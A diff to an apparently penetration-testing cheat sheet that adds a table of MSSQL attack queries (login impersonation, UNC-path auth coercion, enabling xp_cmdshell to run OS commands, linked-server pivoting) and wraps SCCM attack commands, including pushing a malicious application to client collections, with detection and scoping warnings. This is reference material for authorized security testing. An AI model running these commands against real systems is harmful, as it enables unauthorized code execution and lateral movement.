@@ -10,6 +10,17 @@ impacket-mssqlclient <User>@<IP>
 ```
 Connect to an MSSQL server (Impacket).
 
+| Query | Purpose |
+|---|---|
+| `SELECT r.name, r.type_desc, ... FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ...` | Enumerate server logins and roles |
+| `SELECT name FROM sys.server_permissions JOIN sys.server_principals ... WHERE permission_name = 'IMPERSONATE'` | Find logins you can impersonate |
+| `EXEC xp_fileexist '...'` | UNC path injection / file existence check (coerce auth) |
+| `EXEC sp_configure 'xp_cmdshell', 1; ...; EXEC xp_cmdshell '...'` | Enable xp_cmdshell and run an OS command |
+| `EXEC sp_configure 'ole automation procedures', 1; ...` | Enable OLE Automation stored procedures |
+| `EXEC sp_linkedservers;` | Enumerate linked database servers |
+| `SELECT * FROM OPENQUERY(<DB>, '...')` | Run a query against a linked server |
+| `SELECT * FROM OPENQUERY(<DB>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')` | Check sysadmin membership on a linked server |
+
 ```sql
 SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
 ```
@@ -24,6 +35,9 @@ Find logins you can impersonate.
 EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
 ```
 UNC path injection / file existence check (coerce auth). See [ntlm-relay](ntlm-relay.md).
+
+> [!WARNING]
+> Enabling `xp_cmdshell` (and OLE Automation procedures) flips a server-wide advanced option — it's a visible, persistent configuration change on the SQL server, not a transient action. Expect it to be flagged by any DB-activity monitoring.
 
 ```sql
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'ipconfig';
@@ -77,6 +91,10 @@ Generate username variations from names.
 Brute-force creds against Exchange (Ruler).
 
 ## SCCM
+
+<details>
+<summary>Full PXEThief / SCCMHunter / SharpSCCM workflow</summary>
+
 ```bash
 python pxethief.py 2 <TARGET_IP>
 ```
@@ -131,3 +149,8 @@ Create a malicious SCCM application for deployment.
 .\SharpSCCM.exe new deployment -a <APPLICATION_NAME> -c "<COLLECTION_NAME>" -sms <TARGET_IP>
 ```
 Deploy the application to a collection.
+
+</details>
+
+> [!IMPORTANT]
+> `SharpSCCM new application` / `new deployment` push a real application to a device collection — this executes arbitrary code on every client in that collection. Scope the collection carefully before deploying.
